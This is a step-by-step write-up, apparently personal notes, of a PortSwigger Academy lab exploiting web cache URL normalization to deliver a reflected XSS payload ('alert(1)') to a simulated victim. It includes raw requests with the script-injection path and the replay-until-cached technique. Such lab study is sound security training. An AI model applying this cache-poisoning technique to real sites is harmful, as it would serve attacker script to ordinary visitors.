
# #PortSwigger 


![[Pasted image 20260614163322.png]]


## Lab Description
> This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.
> 
> **Objective:** Take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute `alert(1)` in the victim's browser. Then, deliver the malicious URL to the victim.

---
---

## Step 1: Understanding the Vulnerability

**URL normalization:**
- The cache normalizes URLs (e.g., decodes percent-encoded characters) before storing them in the cache key
- The browser URL-encodes special characters, preventing direct XSS
- By poisoning the cache with a normalized (decoded) payload, the browser's encoded request hits the cached malicious response

**The attack chain:**
1. Attacker sends request with unencoded XSS payload in path
2. Cache normalizes (decodes) the URL and stores response
3. Victim clicks link with URL-encoded payload
4. Browser sends encoded request -> cache matches normalized key -> serves poisoned response -> XSS executes

---

## Step 2: Reconnaissance

### Step 2.1: Find a Reflected Path

Browse to any non-existent path:
```
GET /random HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

![[Pasted image 20260614163622.png]]
**Observe:** The path `/random` is reflected in the error message.

The path parameter is reflected

---

## Step 3: Crafting the XSS Payload

### Step 3.1: Test Reflected XSS

```
GET /random</p><script>alert(1)</script><p>foo HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

![[Pasted image 20260614163701.png]]

**In Repeater:** The payload works.

**In Browser:** The payload is URL-encoded and doesn't execute.

---

## Step 4: Poisoning the Cache

### Step 4.1: Send Unencoded Payload

Send the request with the **unencoded** payload:
```
GET /random</p><script>alert(1)</script><p>foo HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### tep 4.2: Replay Until Cached

Keep sending until `X-Cache: hit`.

---

## Step 5: Testing the Exploit

### Step 5.1: Load in Browser

Immediately after poisoning, load the URL in your browser:
```
https://YOUR-LAB-ID.web-security-academy.net/random</p><script>alert(1)</script><p>foo
```

**The browser URL-encodes it to:**
```
https://.../random%3C/p%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cp%3Efoo
```

![[Pasted image 20260614164113.png]]

**But the cache normalizes it back** and serves the poisoned response -> `alert(1)` executes!

---

## Step 6: Delivering to the Victim

### Step 6.1: Re-poison the Cache

Send the unencoded request again to ensure the cache is poisoned.

![[Pasted image 20260614164729.png]]

### Step 6.2: Deliver the Link

Click **"Deliver link to victim"** in the lab.

![[Pasted image 20260614164828.png]]

Submit the malicious URL.

---

## Step 7: Lab Solved

The victim clicks the link, the browser sends the encoded request, the cache serves the poisoned response, and `alert(1)` executes.


![[Pasted image 20260614164657.png]]

---
---
